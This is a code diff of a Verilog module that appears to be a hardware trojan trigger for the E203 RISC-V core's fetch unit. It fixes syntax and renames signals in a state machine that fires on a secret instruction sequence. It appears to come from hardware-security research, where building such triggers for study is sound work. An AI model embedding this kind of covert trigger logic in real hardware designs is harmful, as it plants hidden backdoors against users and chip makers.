@@ -27,11 +27,12 @@
 
 module trig_01_ifu(
   input  [`E203_INSTR_SIZE-1:0] ifu_o_ir,// The instruction register
-  input  trojan_en,//low active
-  output  trig_01_ifu_o,//high when trojan triggered
+  input  trig_01_en,//low active
+  output  reg trig_01_o,//high when trojan triggered
   input  clk,
   input  rst_n
   );
+  
 
   reg [3:0] NS, CS; 
   parameter [3:0]
@@ -39,10 +40,10 @@ module trig_01_ifu(
       S1     = 4'b0001,
       S2     = 4'b0010,
       S3     = 4'b0100,
-      S4     = 4'b1000;
-      S5     = 4'b1001;
-      S6     = 4'b1010;
-      S7     = 4'b1011;
+      S4     = 4'b1000,
+      S5     = 4'b1001,
+      S6     = 4'b1010,
+      S7     = 4'b1011,
       S8     = 4'b1100;
 
   always @ (posedge clk or negedge rst_n)
@@ -54,7 +55,7 @@ module trig_01_ifu(
       NS = 4'bx;                
       case (CS)                     
           IDLE:   begin
-                      if (ifu_o_irifu_o_ir == 32'h01c3_fe33) NS = S1;
+                      if (ifu_o_ir == 32'h01c3_fe33) NS = S1;
                       else NS = IDLE;
                   end
           S1:     begin
@@ -77,10 +78,10 @@ module trig_01_ifu(
           default: NS = IDLE;
       endcase
   end
-  always @ (posedge clk or negedge rst_n or posedge trojan_en)
+  always @ (posedge clk or negedge rst_n or posedge trig_01_en)
       if (!rst_n)
           trig_01_o <= 1'b0;
-      else if(trojan_en)
+      else if(trig_01_en)
           trig_01_o <= 1'b0;
       else begin
           trig_01_o <= 1'b0;
@@ -97,7 +98,7 @@ module trig_01_ifu(
           endcase
       end
 
-  // assign trojan_trigger = (!trojan_en) && ((
+  // assign trojan_trigger = (!trig_01_en) && ((
   // adder_clean_op1[31:0] == 32'b0111_1000_0111_1010_0111_0000_0111_0011)? 1'b1:1'b0);
   
 endmodule
